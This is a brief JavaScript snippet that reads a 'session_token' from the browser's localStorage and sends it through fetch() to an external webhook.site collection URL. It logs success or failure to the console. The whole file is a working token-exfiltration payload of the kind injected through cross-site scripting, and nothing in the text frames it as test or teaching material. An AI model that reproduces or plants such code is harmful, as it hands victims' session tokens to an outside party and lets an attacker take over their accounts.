// Check if session_token exists in localStorage
var sessionToken = localStorage.getItem('session_token');
if (sessionToken) {
    // Construct the URL to send the session token to Webhook.site
    var webhookUrl = 'https://webhook.site/da8ef98b-9bc1-4a3d-8221-212cb6e7ac64';
    // Send the session token as a GET parameter
    fetch(webhookUrl + '?token=' + encodeURIComponent(sessionToken))
        .then(response => {
            if (response.ok) {
                console.log('Session token sent successfully to Webhook.site');
            } else {
                console.error('Failed to send session token:', response.status, response.statusText);
            }
        })
        .catch(error => {
            console.error('Error sending session token:', error);
        });
}
